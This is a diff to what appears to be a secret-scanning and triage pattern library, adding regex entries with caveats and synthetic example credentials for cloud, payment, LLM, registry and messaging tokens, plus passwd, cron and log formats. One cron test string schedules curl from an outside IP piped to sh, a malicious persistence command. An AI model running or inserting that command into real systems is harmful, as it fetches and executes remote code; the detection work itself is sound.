@@ -94,6 +94,21 @@ _CS = r"[ -]?"
 _SLACK_TOKEN_EXAMPLE = "xoxb-" + "123456789012-1234567890123-" \
                        + "AbCdEfGhIjKlMnOpQrStUvWx"
 
+# Synthetic, and split at the boundary each vendor's scanner keys on, so a
+# checkout of this repository does not set off everybody's secret scanning.
+_GOOGLE_KEY_EXAMPLE = "AIza" + "SyD" + "x" * 32            # AIza + exactly 35
+_STRIPE_KEY_EXAMPLE = "sk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc"
+_STRIPE_RK_EXAMPLE = "rk_" + "test_" + "51H8xQvJk2mNpQrStUvWxYz01"
+_ANTHROPIC_KEY_EXAMPLE = "sk-" + "ant-api03-" + "A" * 40
+_OPENAI_KEY_EXAMPLE = "sk-" + "proj-" + "B" * 40
+_GENERIC_SK_EXAMPLE = "sk-" + "C" * 40
+_NPM_TOKEN_EXAMPLE = "npm_" + "a" * 36
+_PYPI_TOKEN_EXAMPLE = "pypi-" + "AgEIcHlwaS5vcmc" + "x" * 55
+_DOCKER_PAT_EXAMPLE = "dckr_" + "pat_" + "y" * 25
+_SENDGRID_EXAMPLE = "SG." + "a" * 22 + "." + "b" * 43
+_TWILIO_EXAMPLE = "SK" + "0" * 32
+_MAILGUN_EXAMPLE = "key-" + "c" * 32
+
 ENTRIES: list[Entry] = [
     # ---------------------------------------------------------------- network
     Entry(
@@ -864,6 +879,196 @@ ENTRIES: list[Entry] = [
         tags=("phone", "pii", "e164"),
     ),
 
+    Entry(
+        id="stripe_key",
+        title="Stripe secret key",
+        family=SECRETS,
+        pattern=r"\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{20,99}\b",
+        summary="Live and test secret keys, including restricted ones.",
+        caveat="A test key moves no money; a live key does. The only "
+               "difference is one word, which is why both are matched and "
+               "why the word matters more than the hit.",
+        matches=(_STRIPE_KEY_EXAMPLE, _STRIPE_RK_EXAMPLE),
+        avoids=("pk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc", "sk_live_short"),
+        tags=("stripe", "payments", "key"),
+    ),
+    Entry(
+        id="google_api_key",
+        title="Google API key",
+        family=SECRETS,
+        pattern=r"\bAIza[0-9A-Za-z_-]{35}\b",
+        summary="The AIza-prefixed key used across Google and Firebase APIs.",
+        caveat="Often embedded in a mobile app or web page on purpose, where "
+               "it is restricted by referrer or package name. Finding one is "
+               "the start of a question about its restrictions, not a breach.",
+        matches=(_GOOGLE_KEY_EXAMPLE,),
+        avoids=("AIzaShort", "B" + _GOOGLE_KEY_EXAMPLE[1:]),
+        tags=("google", "firebase", "api"),
+    ),
+    Entry(
+        id="llm_api_key",
+        title="LLM provider API key",
+        family=SECRETS,
+        pattern=r"\b(?:sk-ant-(?:api|admin)\d{2}-[A-Za-z0-9_-]{32,}"
+                r"|sk-proj-[A-Za-z0-9_-]{32,}"
+                r"|sk-[A-Za-z0-9]{32,})\b",
+        summary="Anthropic and OpenAI keys, including project-scoped ones.",
+        caveat="These bill by the token, so a leaked one is a running cost as "
+               "well as a data-exposure question. The bare sk- form is the "
+               "loosest branch and will pick up other vendors using it.",
+        matches=(_ANTHROPIC_KEY_EXAMPLE, _OPENAI_KEY_EXAMPLE, _GENERIC_SK_EXAMPLE),
+        avoids=("sk-short", "ak-" + "C" * 40),
+        tags=("anthropic", "openai", "llm", "api"),
+    ),
+    Entry(
+        id="package_registry_token",
+        title="Package registry token",
+        family=SECRETS,
+        pattern=r"\b(?:npm_[A-Za-z0-9]{36}"
+                r"|pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{50,}"
+                r"|dckr_pat_[A-Za-z0-9_-]{20,})\b",
+        summary="npm, PyPI and Docker Hub publishing tokens.",
+        caveat="A publish token is a supply-chain key: it can ship code to "
+               "everyone who installs your package. Treat a hit as an "
+               "incident, not a cleanup task.",
+        matches=(_NPM_TOKEN_EXAMPLE, _PYPI_TOKEN_EXAMPLE, _DOCKER_PAT_EXAMPLE),
+        avoids=("npm_short", "pypi-wrongprefix" + "x" * 55),
+        tags=("npm", "pypi", "docker", "supply-chain"),
+    ),
+    Entry(
+        id="messaging_api_key",
+        title="Messaging provider key",
+        family=SECRETS,
+        pattern=r"\b(?:SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}"
+                r"|SK[0-9a-fA-F]{32}"
+                r"|key-[0-9a-zA-Z]{32})\b",
+        summary="SendGrid, Twilio and Mailgun keys.",
+        caveat="Mail and SMS keys are used to send convincing phishing from a "
+               "domain that passes SPF and DKIM, which is usually worse than "
+               "the data behind them.",
+        matches=(_SENDGRID_EXAMPLE, _TWILIO_EXAMPLE, _MAILGUN_EXAMPLE),
+        avoids=("SG.short.short", "SK" + "0" * 10),
+        tags=("sendgrid", "twilio", "mailgun", "phishing"),
+    ),
+    Entry(
+        id="azure_sas",
+        title="Azure SAS token",
+        family=CLOUD,
+        pattern=r"\bsig=[A-Za-z0-9%+/=]{40,}(?:&|\b)",
+        summary="The signature parameter that makes a shared-access URL work.",
+        caveat="The signature IS the credential — anyone holding the URL has "
+               "whatever access it grants until it expires. Check se= for the "
+               "expiry and sp= for the permissions.",
+        matches=("https://x.blob.core.windows.net/c/b?sv=2021-08-06&sp=r&sig="
+                 + "A" * 44 + "&se=2026-01-01",),
+        avoids=("sig=short", "signature=" + "A" * 44),
+        tags=("azure", "sas", "storage", "url"),
+    ),
+    Entry(
+        id="kubernetes_secret",
+        title="Kubernetes service-account token",
+        family=CLOUD,
+        pattern=r"\beyJhbGciOiJSUzI1NiIsImtpZCI6[A-Za-z0-9_-]{10,}"
+                r"\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
+        summary="The RS256 JWT a pod is issued to talk to the API server.",
+        caveat="Distinguished from an ordinary JWT only by its RS256 header "
+               "and a kid. Decode it: the namespace and service account in "
+               "the claims tell you what it can reach.",
+        matches=("eyJhbGciOiJSUzI1NiIsImtpZCI6IkFCQ0RFRkcifQ.eyJzdWIiOiJzeXN0ZW0ifQ.sig",),
+        avoids=("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc",),
+        tags=("kubernetes", "k8s", "token", "serviceaccount"),
+    ),
+    Entry(
+        id="ja3_fingerprint",
+        title="JA3 or JA4 TLS fingerprint",
+        family=INTEL,
+        pattern=r"\b(?:ja3s?|ja4[a-z]?)\s*[=:]\s*[\"']?"
+                r"(?:[0-9a-f]{32}"
+                r"|[a-z]\d{2}[a-z]\d{4}[a-z0-9]{2}(?:_[0-9a-f]{12}){2}"
+                r"|\d+(?:,[\d\-]*){4})",
+        summary="A labelled TLS client fingerprint, JA3's MD5 or JA4's form.",
+        caveat="Fingerprints identify the TLS library and its settings, not "
+               "the program — many tools share one, and JA3 in particular "
+               "collides. A match narrows the field; it does not name a tool.",
+        matches=("ja3=771,4865-4866,0-23-65281,29-23-24,0",
+                 "ja3: e7d705a3286e19ea42f587b344ee6865",
+                 'ja4="t13d1516h2_8daaf6152771_02713d6af862"'),
+        avoids=("ja3=", "hash: e7d705a3286e19ea42f587b344ee6865"),
+        ignore_case=True,
+        tags=("tls", "ja3", "ja4", "fingerprint"),
+    ),
+    Entry(
+        id="passwd_entry",
+        title="Unix passwd entry",
+        family=FILES,
+        pattern=r"^[a-z_][a-z0-9_-]{0,31}:[^:]*:\d+:\d+:[^:]*:[^:]*:\S*$",
+        summary="A line of /etc/passwd: name, marker, uid, gid, gecos, home, shell.",
+        caveat="Anchored to a whole line, so it needs multiline matching. "
+               "UID 0 on anything but root, and a real shell on a service "
+               "account, are the two lines worth finding here.",
+        matches=("root:x:0:0:root:/root:/bin/bash",
+                 "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin"),
+        avoids=("not a passwd line", "root:x:0:0"),
+        tags=("passwd", "unix", "accounts", "privilege"),
+    ),
+    Entry(
+        id="cron_entry",
+        title="Crontab entry",
+        family=FILES,
+        pattern=r"^\s*(?:@(?:reboot|yearly|annually|monthly|weekly|daily|hourly)"
+                r"|[\d*/,\-]+\s+[\d*/,\-]+\s+[\d*/,\-]+\s+[\d*/,\-]+\s+"
+                r"[\d*/,\-]+)\s+\S.*$",
+        summary="A schedule — five fields or an @ shortcut — and its command.",
+        caveat="cron is a favourite persistence mechanism precisely because "
+               "these lines look ordinary. What matters is the command, and "
+               "whether anyone can account for it.",
+        matches=("*/5 * * * * /usr/bin/curl http://203.0.113.9/a | sh",
+                 "@reboot /tmp/.x/run"),
+        avoids=("# a comment", "just some text"),
+        tags=("cron", "persistence", "schedule"),
+    ),
+    Entry(
+        id="snmp_community",
+        title="SNMP community string",
+        family=NETWORK,
+        pattern=r"(?:snmp-server\s+community|community[-_ ]?string\s*[:=])"
+                r"\s*[\"']?([^\s\"']{1,64})",
+        summary="The community string from a device config or a capture.",
+        caveat="SNMP v1 and v2c send this in cleartext, so it is a password "
+               "on the wire. 'public' and 'private' are the defaults and are "
+               "still in production more often than anyone admits.",
+        matches=("snmp-server community public RO",
+                 "community_string = s3cr3t"),
+        avoids=("snmp-server host 10.0.0.1",),
+        ignore_case=True,
+        tags=("snmp", "network", "cleartext", "default"),
+    ),
+    Entry(
+        id="logfmt_pair",
+        title="logfmt key and value",
+        family=LOGS,
+        pattern=r"\b([a-zA-Z_][\w.]*)=(\"[^\"]*\"|\S+)",
+        summary="The key=value form used by Go services, Heroku and Grafana.",
+        caveat="Matches one pair at a time, so a line yields many. Quote-aware "
+               "only to the extent of not crossing a closing quote.",
+        matches=('level=error msg="connection refused" src=10.0.4.9',),
+        avoids=("just some prose without pairs",),
+        tags=("logfmt", "structured", "go"),
+    ),
+    Entry(
+        id="json_log_line",
+        title="JSON log line",
+        family=LOGS,
+        pattern=r"^\s*\{(?=[^\n]*\"(?:level|severity|msg|message|@timestamp"
+                r"|time|ts)\")[^\n]*\}\s*$",
+        summary="A whole line that is a JSON object carrying a log-shaped key.",
+        caveat="A shape check, not a parser — it does not validate the JSON. "
+               "For anything beyond finding these lines, parse them.",
+        matches=('{"level":"error","msg":"boom","src":"10.0.4.9"}',
+                 '{"@timestamp":"2024-03-11T09:15:02Z","message":"x"}'),
+        avoids=('{"unrelated":"object"}', "not json at all"),
+        tags=("json", "structured", "ecs"),
+    ),
     # ------------------------------------------------------------------ cloud
     Entry(
         id="aws_arn",
